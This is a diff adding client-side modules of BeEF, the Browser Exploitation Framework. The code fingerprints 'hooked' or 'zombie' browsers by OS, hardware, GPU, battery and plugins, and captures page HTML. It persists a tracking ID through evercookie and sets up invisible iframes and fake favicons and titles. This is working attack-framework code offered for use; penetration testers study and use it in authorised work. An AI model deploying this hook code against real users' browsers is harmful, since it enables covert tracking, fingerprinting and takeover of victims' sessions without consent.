+                    ggfactory.width = 0;
+                    ggfactory.height = 0;
+                    ggfactory.type = "application/x-googlegears";
+                    document.documentElement.appendChild(ggfactory);
+                    if (ggfactory && (typeof ggfactory.create == 'undefined')) ggfactory = null;
+                }
+            }
+        }
+        if (!ggfactory) return false; else return true;
+    },
+
+    /**
+     * Checks if the zombie has Foxit PDF reader plugin.
+     * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.hasFoxit()) { ... }
+     * */
+    hasFoxit: function () {
+
+        var foxitplugin = false;
+
+        try {
+            if (beef.browser.hasActiveX()) {
+                var foxitControl = new ActiveXObject('FoxitReader.FoxitReaderCtl.1');
+                foxitplugin = true;
+            } else if (navigator.plugins['Foxit Reader Plugin for Mozilla']) {
+                foxitplugin = true;
+            }
+        } catch (e) {
+            foxitplugin = false;
+        }
+
+        return foxitplugin;
+    },
+
+    /**
+     * Returns the page head HTML
+     **/
+    getPageHead: function () {
+        var html_head;
+        try {
+            html_head = document.head.innerHTML.toString();
+        } catch (e) {
+        }
+        return html_head;
+    },
+
+    /**
+     * Returns the page body HTML
+     **/
+    getPageBody: function () {
+        var html_body;
+        try {
+            html_body = document.body.innerHTML.toString();
+        } catch (e) {
+        }
+        return html_body;
+    },
+
+    /**
+     * Dynamically changes the favicon: works in Firefox, Chrome and Opera
+     **/
+    changeFavicon: function (favicon_url) {
+        var iframe = null;
+        if (this.isC()) {
+            iframe = document.createElement('iframe');
+            iframe.src = 'about:blank';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        }
+        var link = document.createElement('link'),
+            oldLink = document.getElementById('dynamic-favicon');
+        link.id = 'dynamic-favicon';
+        link.rel = 'shortcut icon';
+        link.href = favicon_url;
+        if (oldLink) document.head.removeChild(oldLink);
+        document.head.appendChild(link);
+        if (this.isC()) iframe.src += '';
+    },
+
+    /**
+     * Changes page title
+     **/
+    changePageTitle: function (title) {
+        document.title = title;
+    },
+
+    /**
+     * Get the browser language
+     */
+    getBrowserLanguage: function () {
+        var l = 'Unknown';
+        try {
+            l = window.navigator.userLanguage || window.navigator.language;
+        } catch (e) {
+        }
+        return l;
+    },
+
+    /**
+     *  A function that gets the max number of simultaneous connections the
+     *  browser can make per origin, or globally on all origin.
+     *
+     *  This code is based on research from browserspy.dk
+     *
+     * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
+     * @return {Object} A jQuery deferred object promise, which when resolved passes
+     *    the number of connections to the callback function as "this"
+     */
+
+
+
+    getMaxConnections: function (scope) {
+        /*
+        *    example usage:
+        *        $j.when(getMaxConnections()).done(function(){
+        *            console.debug("Max Connections: " + this);
+        *            }); 
+        */
+        var imagesCount = 30;		// Max number of images to test
+        var secondsTimeout = 5;		// Image load timeout threashold
+        var testUrl = "";		// The image testing service URL
+
+        // User broserspy.dk max connections service URL.
+        if (scope == 'PER_DOMAIN')
+            testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
+        else
+            // The token will be replaced by a different number with each request (different origin).
+            testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";
+
+        var imagesLoaded = 0;			// Number of responding images before timeout.
+        var imagesRequested = 0;		// Number of requested images.
+        var testImages = new Array();		// Array of all images.
+        var deferredObject = $j.Deferred();	// A jquery Deferred object.
+
+        for (var i = 1; i <= imagesCount; i++) {
+            // Asynchronously request image.
+            testImages[i] =
+                $j.ajax({
+                    type: "get",
+                    dataType: true,
+                    url: (testUrl.replace("<token>", i)) + Math.random(),
+                    data: "",
+                    timeout: (secondsTimeout * 1000),
+
+                    // Function on completion of request.
+                    complete: function (jqXHR, textStatus) {
+
+                        imagesRequested++;
+
+                        // If the image returns a 200 or a 302, the text Status is "error", else null
+                        if (textStatus == "error") {
+                            imagesLoaded++;
+                        }
+
+                        // If all images requested
+                        if (imagesRequested >= imagesCount) {
+                            // resolve the deferred object passing the number of loaded images.
+                            deferredObject.resolveWith(imagesLoaded);
+                        }
+                    }
+                });
+
+        }
+
+        // Return a promise to resolve the deffered object when the images are loaded.
+        return deferredObject.promise();
+
+    }
+
+};
+
+beef.regCmp('beef.browser');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides fuctions for working with cookies. 
+ * Several functions adopted from http://techpatterns.com/downloads/javascript_cookies.php
+ * Original author unknown.
+ * @namespace beef.browser.cookie
+ */
+beef.browser.cookie = {
+	
+		/** @memberof beef.browser.cookie */
+		setCookie: function (name, value, expires, path, domain, secure) 
+		{
+	
+			var today = new Date();
+			today.setTime( today.getTime() );
+	
+			if ( expires )
+			{
+				expires = expires * 1000 * 60 * 60 * 24;
+			}
+			var expires_date = new Date( today.getTime() + (expires) );
+	
+			document.cookie = name + "=" +escape( value ) +
+				( ( expires ) ? ";expires=" + expires_date.toGMTString() : "" ) +
+				( ( path ) ? ";path=" + path : "" ) +
+				( ( domain ) ? ";domain=" + domain : "" ) +
+				( ( secure ) ? ";secure" : "" );
+		},
+		/** @memberof beef.browser.cookie */
+		getCookie: function(name) 
+		{
+			var a_all_cookies = document.cookie.split( ';' );
+			var a_temp_cookie = '';
+			var cookie_name = '';
+			var cookie_value = '';
+			var b_cookie_found = false;
+			
+			for ( i = 0; i < a_all_cookies.length; i++ )
+			{
+				a_temp_cookie = a_all_cookies[i].split( '=' );
+				cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
+				if ( cookie_name == name )
+				{
+					b_cookie_found = true;
+					if ( a_temp_cookie.length > 1 )
+					{
+						cookie_value = unescape( a_temp_cookie[1].replace(/^\s+|\s+$/g, '') );
+					}
+					return cookie_value;
+					break;
+				}
+				a_temp_cookie = null;
+				cookie_name = '';
+			}
+			if ( !b_cookie_found )
+			{
+				return null;
+			}
+		},
+		/** @memberof beef.browser.cookie */
+		deleteCookie: function (name, path, domain) 
+		{
+			if ( this.getCookie(name) ) document.cookie = name + "=" +
+			( ( path ) ? ";path=" + path : "") +
+			( ( domain ) ? ";domain=" + domain : "" ) +
+			";expires=Thu, 01-Jan-1970 00:00:01 GMT";
+		},
+
+	    /** @memberof beef.browser.cookie */
+		cookieValueRandomizer: function (){
+			var to_hell= '';
+			var min = 17;
+			var max = 25;
+			var lol_length = Math.floor(Math.random() * (max - min + 1)) + min;
+
+			var grunt = function(){
+				var moo = Math.floor(Math.random() * 62);
+				var char = '';
+				if(moo < 36){
+					char = String.fromCharCode(moo + 55);
+				}else{
+					char = String.fromCharCode(moo + 61);
+				}
+				if(char != ';' && char != '='){
+					return char;
+				}else{
+					return 'x';
+				}
+			};
+
+			while(to_hell.length < lol_length){
+				to_hell += grunt();
+			}
+			return to_hell;
+		},
+		/** @memberof beef.browser.cookie */
+		hasSessionCookies: function (name){
+			this.setCookie( name, beef.browser.cookie.cookieValueRandomizer(), '', '/', '', '' );
+
+			cookiesEnabled = (this.getCookie(name) == null)? false:true;
+			this.deleteCookie(name, '/', '');
+			return cookiesEnabled;
+			
+		},
+		/** @memberof beef.browser.cookie */
+		hasPersistentCookies: function (name){
+			this.setCookie( name, beef.browser.cookie.cookieValueRandomizer(), 1, '/', '', '' );
+
+			cookiesEnabled = (this.getCookie(name) == null)? false:true;
+			this.deleteCookie(name, '/', '');
+			return cookiesEnabled;
+			
+		}	
+					
+};
+
+beef.regCmp('beef.browser.cookie');
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides fuctions for working with cookies. 
+ * Several functions adopted from http://davidwalsh.name/popup-block-javascript
+ * Original author unknown.
+ * @namespace beef.browser.popup
+ */
+beef.browser.popup = {
+		/** @memberof beef.browser.popup */
+		blocker_enabled: function ()
+		{
+			screenParams = beef.hardware.getScreenSize();
+			var popUp = window.open('/', 'windowName0', 'width=1, height=1, left='+screenParams.width+', top='+screenParams.height+', scrollbars, resizable');
+			if (popUp == null || typeof(popUp)=='undefined') {   
+			  	return true;
+			} else {   
+				popUp.close();
+				return false;
+			}
+		}
+};
+
+beef.regCmp('beef.browser.popup');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides basic session functions.
+ * @namespace beef.session
+ */
+beef.session = {
+	
+	hook_session_id_length: 80,
+	hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",	
+	ec: new evercookie(),
+    beefhook: "BEEFHOOK",
+	
+	/**
+	 * Gets a string which will be used to identify the hooked browser session
+	 * 
+	 * @example: var hook_session_id = beef.session.get_hook_session_id();
+	 */
+  	get_hook_session_id: function() {
+		// check if the browser is already known to the framework
+		var id = this.ec.evercookie_cookie(beef.session.beefhook);
+		if (typeof id == 'undefined') {
+			var id = this.ec.evercookie_userdata(beef.session.beefhook);
+		}
+		if (typeof id == 'undefined') {
+			var id = this.ec.evercookie_window(beef.session.beefhook);
+		}
+		
+		// if the browser is not known create a hook session id and set it
+		if ((typeof id == 'undefined') || (id == null)) {
+			id = this.gen_hook_session_id();
+			this.set_hook_session_id(id);
+		}
+		
+		// return the hooked browser session identifier
+		return id;
+	},
+	
+	/**
+	 * Sets a string which will be used to identify the hooked browser session
+	 * 
+	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
+	 */
+  	set_hook_session_id: function(id) {
+		// persist the hook session id
+		this.ec.evercookie_cookie(beef.session.beefhook, id);
+		this.ec.evercookie_userdata(beef.session.beefhook, id);
+		this.ec.evercookie_window(beef.session.beefhook, id);
+	},
+	
+	/**
+	 * Generates a random string using the chars in hook_session_id_chars.
+	 * 
+	 * @example: beef.session.gen_hook_session_id();
+	 */
+  	gen_hook_session_id: function() {
+	    // init the return value
+		var hook_session_id = "";
+		
+		// construct the random string 
+		for(var i=0; i<this.hook_session_id_length; i++) {
+		  var rand_num = Math.floor(Math.random()*this.hook_session_id_chars.length);
+		  hook_session_id += this.hook_session_id_chars.charAt(rand_num);
+		}
+		
+		return hook_session_id;
+	}
+};
+
+beef.regCmp('beef.session');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/** @namespace beef.os */
+
+beef.os = {
+
+	ua: navigator.userAgent,
+
+	/**
+	  * Detect default browser (IE only)
+	  * Written by unsticky
+	  * http://ha.ckers.org/blog/20070319/detecting-default-browser-in-ie/
+	  * @return {string}
+	  */
+	getDefaultBrowser: function() {
+		var result = "Unknown"
+		try {
+			var mt = document.mimeType;
+			if (mt) {
+				if (mt == "Safari Document")       result = "Safari";
+				if (mt == "Firefox HTML Document") result = "Firefox";
+				if (mt == "Chrome HTML Document")  result = "Chrome";
+				if (mt == "HTML Document")         result = "Internet Explorer";
+				if (mt == "Opera Web Document")    result = "Opera";
+			}
+		} catch (e) {
+			beef.debug("[os] getDefaultBrowser: "+e.message);
+		}
+		return result;
+	},
+	
+	// the likelihood that we hook Windows 3.11 (which has only Win in the UA string) is zero in 2015
+	/**
+	 * @return {boolean}
+	 */
+	isWin311: function() {
+		return (this.ua.match('(Win16)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWinNT4: function() {
+		return (this.ua.match('(Windows NT 4.0)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWin95: function() {
+		return (this.ua.match('(Windows 95)|(Win95)|(Windows_95)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWinCE: function() {
+		return (this.ua.match('(Windows CE)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWin98: function() {
+		return (this.ua.match('(Windows 98)|(Win98)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWinME: function() {
+		return (this.ua.match('(Windows ME)|(Win 9x 4.90)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWin2000: function() {
+		return (this.ua.match('(Windows NT 5.0)|(Windows 2000)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWin2000SP1: function() {
+		return (this.ua.match('Windows NT 5.01 ')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWinXP: function() {
+		return (this.ua.match('(Windows NT 5.1)|(Windows XP)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWinServer2003: function() {
+		return (this.ua.match('(Windows NT 5.2)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWinVista: function() {
+		return (this.ua.match('(Windows NT 6.0)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWin7: function() {
+		return (this.ua.match('(Windows NT 6.1)|(Windows NT 7.0)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWin8: function() {
+		return (this.ua.match('(Windows NT 6.2)')) ? true : false;
+	},	
+	/**
+	 * @return {boolean}
+	 */
+	isWin81: function() {
+		return (this.ua.match('(Windows NT 6.3)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWin10: function() {
+		return (this.ua.match('Windows NT 10.0')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isOpenBSD: function() {
+		return (this.ua.indexOf('OpenBSD') != -1) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isSunOS: function() {
+		return (this.ua.indexOf('SunOS') != -1) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isLinux: function() {
+		return (this.ua.match('(Linux)|(X11)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isMacintosh: function() {
+		return (this.ua.match('(Mac_PowerPC)|(Macintosh)|(MacIntel)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isOsxYosemite: function(){ // TODO
+		return (this.ua.match('(OS X 10_10)|(OS X 10.10)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isOsxMavericks: function(){ // TODO
+		return (this.ua.match('(OS X 10_9)|(OS X 10.9)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isOsxSnowLeopard: function(){ // TODO
+		return (this.ua.match('(OS X 10_8)|(OS X 10.8)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isOsxLeopard: function(){ // TODO
+		return (this.ua.match('(OS X 10_7)|(OS X 10.7)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWinPhone: function() {
+		return (this.ua.match('(Windows Phone)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isIphone: function() {
+		return (this.ua.indexOf('iPhone') != -1) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isIpad: function() {
+		return (this.ua.indexOf('iPad') != -1) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isIpod: function() {
+		return (this.ua.indexOf('iPod') != -1) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isNokia: function() {
+		return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isAndroid: function() {
+		return (this.ua.match('Android')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isBlackBerry: function() {
+		return (this.ua.match('BlackBerry')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWebOS: function() {
+		return (this.ua.match('webOS')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isQNX: function() {
+		return (this.ua.match('QNX')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isBeOS: function() {
+		return (this.ua.match('BeOS')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isAros: function() {
+			return (this.ua.match('AROS')) ? true : false;
+	},
+	/**
+	 * @return {boolean}
+	 */
+	isWindows: function() {
+		return (this.ua.match('Windows')) ? true : false;
+	},
+	/**
+	 * @return {string}
+	 */
+	getName: function() {
+		
+		if(this.isWindows()){
+			return 'Windows';
+		}
+
+		if(this.isMacintosh()) {
+			return 'OSX';
+		}
+
+		//Nokia
+		if(this.isNokia()) {
+			if (this.ua.indexOf('Maemo Browser') != -1) return 'Maemo';
+			if (this.ua.match('(SymbianOS)|(Symbian OS)')) return 'SymbianOS';
+			if (this.ua.indexOf('Symbian') != -1) return 'Symbian';
+		}
+
+		// BlackBerry
+		if(this.isBlackBerry()) return 'BlackBerry OS';
+
+		// Android
+		if(this.isAndroid()) return 'Android';
+
+		// SunOS
+		if(this.isSunOS()) return 'SunOS';
+
+		//Linux
+		if(this.isLinux()) return 'Linux';
+
+		//iPhone
+		if (this.isIphone()) return 'iOS';
+		//iPad
+		if (this.isIpad()) return 'iOS';
+		//iPod
+		if (this.isIpod()) return 'iOS';
+		
+		//others
+		if(this.isQNX()) return 'QNX';
+		if(this.isBeOS()) return 'BeOS';
+		if(this.isWebOS()) return 'webOS';
+		if(this.isAros()) return 'AROS';
+		
+		return 'unknown';
+	},
+
+  /**
+    * Get OS architecture.
+    * This may not be the same as the browser arch or CPU arch.
+    * ie, 32bit OS on 64bit hardware
+    */
+  getArch: function() {
+    var arch = 'unknown';
+    try {
+      var arch = platform.os.architecture;
+      if (!!arch)
+        return arch;
+    } catch (e) {}
+
+    return arch;
+  },
+
+  /**
+    * Get OS family
+    */
+  getFamily: function() {
+    var family = 'unknown';
+    try {
+      var family = platform.os.family;
+      if (!!family)
+        return family;
+    } catch (e) {}
+
+    return arch;
+  },
+
+  /**
+    * Get OS name
+	* @return {string}
+    */
+	getVersion: function(){
+		//Windows
+		if(this.isWindows()) {
+			if (this.isWin10())         return '10';
+			if (this.isWin81())         return '8.1';
+			if (this.isWin8())          return '8';
+			if (this.isWin7())          return '7';
+			if (this.isWinVista())      return 'Vista';
+			if (this.isWinXP())         return 'XP';
+			if (this.isWinServer2003()) return 'Server 2003';
+			if (this.isWin2000SP1())    return '2000 SP1';
+			if (this.isWin2000())       return '2000';
+			if (this.isWinME())         return 'Millenium';
+
+			if (this.isWinNT4())        return 'NT 4';
+			if (this.isWinCE())         return 'CE';
+			if (this.isWin95())         return '95';
+			if (this.isWin98())         return '98';
+		}
+
+		// OS X
+		if(this.isMacintosh()) {
+			if (this.isOsxYosemite())        return '10.10';
+			if (this.isOsxMavericks())       return '10.9';
+			if (this.isOsxSnowLeopard())     return '10.8';
+			if (this.isOsxLeopard())         return '10.7';
+		}
+
+		// TODO add Android/iOS version detection
+	}
+};
+
+beef.regCmp('beef.net.os');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * @namespace beef.hardware
+ */
+
+beef.hardware = {
+
+  ua: navigator.userAgent,
+
+  /**
+   * @return {String} CPU type
+   */
+  getCpuArch: function() {
+    var arch = 'UNKNOWN';
+    // note that actually WOW64 means IE 32bit and Windows 64 bit. we are more interested
+    // in detecting the OS arch rather than the browser build
+    if (navigator.userAgent.match('(WOW64|x64|x86_64)') || navigator.platform.toLowerCase() == "win64"){
+      arch = 'x86_64';
+    }else if(typeof navigator.cpuClass != 'undefined'){
+      switch (navigator.cpuClass) {
+        case '68K':
+          arch = 'Motorola 68K';
+          break;
+        case 'PPC':
+          arch = 'Motorola PPC';
+          break;
+        case 'Digital':
+          arch = 'Alpha';
+          break;
+        default:
+          arch = 'x86';
+      }
+    }
+    // TODO we can infer the OS is 64 bit, if we first detect the OS type (os.js).
+    // For example, if OSX is at least 10.7, most certainly is 64 bit.
+    return arch;
+  },
+
+  /**
+   * Returns number of CPU cores
+   * @return {String}
+   */
+  getCpuCores: function() {
+    var cores = 'unknown';
+    try {
+      if(typeof navigator.hardwareConcurrency != 'undefined') {
+        cores = navigator.hardwareConcurrency;
+      }
+    } catch(e) {
+      cores = 'unknown';
+    }
+    return cores;
+  },
+
+  /**
+   * Returns CPU details
+   * @return {String}
+   */
+  getCpuDetails: function() {
+    return {
+      arch: beef.hardware.getCpuArch(),
+      cores: beef.hardware.getCpuCores()
+    }
+  },
+
+  /**
+   * Returns GPU details
+   * @return {object}
+   */
+  getGpuDetails: function() {
+    var gpu = 'unknown';
+    var vendor = 'unknown';
+    // use canvas technique:
+    // https://github.com/Valve/fingerprintjs2
+    // http://codeflow.org/entries/2016/feb/10/webgl_debug_renderer_info-extension-survey-results/
+    try {
+      var getWebglCanvas = function () {
+        var canvas = document.createElement('canvas')
+        var gl = null
+        try {
+          gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
+        } catch (e) { }
+        if (!gl) { gl = null }
+        return gl;
+      }
+
+      var glContext = getWebglCanvas();
+      var extensionDebugRendererInfo = glContext.getExtension('WEBGL_debug_renderer_info');
+      var gpu = glContext.getParameter(extensionDebugRendererInfo.UNMASKED_RENDERER_WEBGL);
+      var vendor = glContext.getParameter(extensionDebugRendererInfo.UNMASKED_VENDOR_WEBGL);
+      beef.debug("GPU: " + gpu + " - Vendor: " + vendor);
+    } catch (e) {
+      beef.debug('Failed to detect WebGL renderer: ' + e.toString());
+    }
+    return {
+      gpu: gpu,
+      vendor: vendor
+    }
+  },
+
+  /**
+   * Returns RAM (GiB)
+   * @return {String}
+   */
+  getMemory: function() {
+    var memory = 'unknown';
+    try {
+      if(typeof navigator.deviceMemory != 'undefined') {
+        memory = navigator.deviceMemory;
+      }
+    } catch(e) {
+      memory = 'unknown';
+    }
+    return memory;
+  },
+
+  /**
+   * Returns battery details
+   * @return {Object}
+   */
+  getBatteryDetails: function() {
+    var battery = navigator.battery || navigator.webkitBattery || navigator.mozBattery;
+
+    if (!!battery) {
+      return {
+        chargingStatus: battery.charging,
+        batteryLevel: battery.level * 100 + "%",
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      }
+    } else {
+      return {
+        chargingStatus: 'unknown',
+        batteryLevel: 'unknown',
+        chargingTime: 'unknown',
+        dischargingTime: 'unknown'
+      }
+    }
+  },
+
+  /**
+   * Returns zombie screen size and color depth.
+   * @return {Object}
+   */
+  getScreenSize: function () {
+    return {
+      width: window.screen.width,
+      height: window.screen.height,
+      colordepth: window.screen.colorDepth
+    }
+  },
+
+  /**
+   * Is touch enabled?
+   * @return {Boolean} true or false.
+   */
+  isTouchEnabled: function() {
+    if ('ontouchstart' in document) return true;
+    return false;
+  },
+
+  /**
+   * Is virtual machine?
+   * @return {Boolean} true or false.
+   */
+  isVirtualMachine: function() {
+    if (this.getGpuDetails().vendor.match('VMware, Inc'))
+      return true;
+
+    if (this.isMobileDevice())
+      return false;
+
+    // if the screen resolution is uneven, and it's not a known mobile device
+    // then it's probably a VM
+    if (screen.width % 2 || screen.height % 2)
+      return true;
+
+    return false;
+  },
+
+  /**
+   * Is a Laptop?
+   * @return {Boolean} true or false.
+   */
+  isLaptop: function() {
+    if (this.isMobileDevice()) return false;
+    // Most common laptop screen resolution
+    if (screen.width == 1366 && screen.height == 768) return true;
+    // Netbooks
+    if (screen.width == 1024 && screen.height == 600) return true;
+    return false;
+  },
+
+  /**
+   * Is Nokia?
+   * @return {Boolean} true or false.
+   */
+  isNokia: function() {
+    return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)|(Lumia )')) ? true : false;
+  },
+
+  /**
+   * Is Zune?
+   * @return {Boolean} true or false.
+   */
+  isZune: function() {
+    return (this.ua.match('ZuneWP7')) ? true : false;
+  },
+
+  /**
+   * Is HTC?
+   * @return {Boolean} true or false.
+   */
+  isHtc: function() {
+    return (this.ua.match('HTC')) ? true : false;
+  },
+
+  /**
+   * Is Ericsson?
+   * @return {Boolean} true or false.
+   */
+  isEricsson: function() {
+    return (this.ua.match('Ericsson')) ? true : false;
+  },
+
+  /**
+   * Is Motorola?
+   * @return {Boolean} true or false.
+   */
+  isMotorola: function() {
+    return (this.ua.match('Motorola')) ? true : false;
+  },
+
+  /**
+   * Is Google?
+   * @return {Boolean} true or false.
+   */
+  isGoogle: function() {
+    return (this.ua.match('Nexus One')) ? true : false;
+  },
+
+  /**
+   * Returns true if the browser is on a Mobile device
+   * @return {Boolean} true or false
+   *
+   * @example: if(beef.hardware.isMobileDevice()) { ... }
+   */
+  isMobileDevice: function() {
+    return MobileEsp.DetectMobileQuick();
+  },
+
+  /**
+   * Returns true if the browser is on a game console
+   * @return {Boolean} true or false
+   *
+   * @example: if(beef.hardware.isGameConsole()) { ... }
+   */
+  isGameConsole: function() {
+    return MobileEsp.DetectGameConsole();
+  },
+
+  getName: function() {
+    var ua = navigator.userAgent.toLowerCase();
+    if(MobileEsp.DetectIphone())              { return "iPhone"};
+    if(MobileEsp.DetectIpod())                { return "iPod Touch"};
+    if(MobileEsp.DetectIpad())                { return "iPad"};
+    if (this.isHtc())               { return 'HTC'};
+    if (this.isMotorola())          { return 'Motorola'};
+    if (this.isZune())              { return 'Zune'};
+    if (this.isGoogle())            { return 'Google Nexus One'};
+    if (this.isEricsson())          { return 'Ericsson'};
+    if(MobileEsp.DetectAndroidPhone())        { return "Android Phone"};
+    if(MobileEsp.DetectAndroidTablet())       { return "Android Tablet"};
+    if(MobileEsp.DetectS60OssBrowser())       { return "Nokia S60 Open Source"};
+    if(ua.search(MobileEsp.deviceS60) > -1)   { return "Nokia S60"};
+    if(ua.search(MobileEsp.deviceS70) > -1)   { return "Nokia S70"};
+    if(ua.search(MobileEsp.deviceS80) > -1)   { return "Nokia S80"};
+    if(ua.search(MobileEsp.deviceS90) > -1)   { return "Nokia S90"};
+    if(ua.search(MobileEsp.deviceSymbian) > -1)   { return "Nokia Symbian"};
+    if (this.isNokia())             { return 'Nokia'};
+    if(MobileEsp.DetectWindowsPhone7())       { return "Windows Phone 7"};
+    if(MobileEsp.DetectWindowsPhone8())       { return "Windows Phone 8"};
+    if(MobileEsp.DetectWindowsPhone10())      { return "Windows Phone 10"};
+    if(MobileEsp.DetectWindowsMobile())       { return "Windows Mobile"};
+    if(MobileEsp.DetectBlackBerryTablet())    { return "BlackBerry Tablet"};
+    if(MobileEsp.DetectBlackBerryWebKit())    { return "BlackBerry OS 6"};
+    if(MobileEsp.DetectBlackBerryTouch())     { return "BlackBerry Touch"};
+    if(MobileEsp.DetectBlackBerryHigh())      { return "BlackBerry OS 5"};
+    if(MobileEsp.DetectBlackBerry())          { return "BlackBerry"};
+    if(MobileEsp.DetectPalmOS())              { return "Palm OS"};
+    if(MobileEsp.DetectPalmWebOS())           { return "Palm Web OS"};
+    if(MobileEsp.DetectGarminNuvifone())      { return "Gamin Nuvifone"};
+    if(MobileEsp.DetectArchos())              { return "Archos"}
+    if(MobileEsp.DetectBrewDevice())          { return "Brew"};
+    if(MobileEsp.DetectDangerHiptop())        { return "Danger Hiptop"};
+    if(MobileEsp.DetectMaemoTablet())         { return "Maemo Tablet"};
+    if(MobileEsp.DetectSonyMylo())            { return "Sony Mylo"};
+    if(MobileEsp.DetectAmazonSilk())          { return "Kindle Fire"};
+    if(MobileEsp.DetectKindle())              { return "Kindle"};
+    if(MobileEsp.DetectSonyPlaystation())                 { return "Playstation"};
+    if(ua.search(MobileEsp.deviceNintendoDs) > -1)        { return "Nintendo DS"};
+    if(ua.search(MobileEsp.deviceWii) > -1)               { return "Nintendo Wii"};
+    if(ua.search(MobileEsp.deviceNintendo) > -1)          { return "Nintendo"};
+    if(MobileEsp.DetectXbox())                            { return "Xbox"};
+    if(this.isLaptop())                         { return "Laptop"};
+    if(this.isVirtualMachine())                 { return "Virtual Machine"};
+
+    return 'Unknown';
+  }
+};
+
+beef.regCmp('beef.hardware');
+
+
+//
+// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - https://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Provides functionality to manipulate the DOM.
+ * @namespace beef.dom
+ */
+beef.dom = {
+	
+	/**
+	 * Generates a random ID for HTML elements
+	 * @param {String} prefix a custom prefix before the random id. defaults to "beef-"
+	 * @return {String} generated id
+	 */
+	generateID: function(prefix) {
+		return ((prefix == null) ? 'beef-' : prefix)+Math.floor(Math.random()*99999);
+	},	
+		
+	/**
+	 * Creates a new element but does not append it to the DOM.
+	 * @param {String} type the name of the element.
+	 * @param {Array} attributes the attributes of that element.
+	 * @return {Array} the created element.
+	 */
+	createElement: function(type, attributes) {
+		var el = document.createElement(type);
+		
+		for(index in attributes) {
+			if(typeof attributes[index] == 'string') {
+				el.setAttribute(index, attributes[index]);
+			}
+		}
+		
+		return el;
+	},
+	
+	/**
+	 * Removes element from the DOM.
+	 * @param {Object} el the target element to be removed.
+	 */
+	removeElement: function(el) {
+		if (!beef.dom.isDOMElement(el))
+		{
+			el = document.getElementById(el);
+		}
+		try {
+			el.parentNode.removeChild(el);
+		} catch (e) { }
+	},
+	
+	/**
+	 * Tests if the object is a DOM element.
+	 * @param {Object} the DOM element.
+	 * @return {boolean} true if the object is a DOM element.
+	 */
+	isDOMElement: function(obj) {
+		return (obj.nodeType) ? true : false;
+	},
+	
+	/**
+	 * Creates an invisible iframe on the hook browser's page.
+	 * @return {array} the iframe.
+	 */
+	createInvisibleIframe: function() {
+		var iframe = this.createElement('iframe', {
+				width: '1px',
+				height: '1px',
+				style: 'visibility:hidden;'
+			});
+		
+		document.body.appendChild(iframe);
+		
+		return iframe;
+	},
+
+	/**
+	 * Returns the highest current z-index
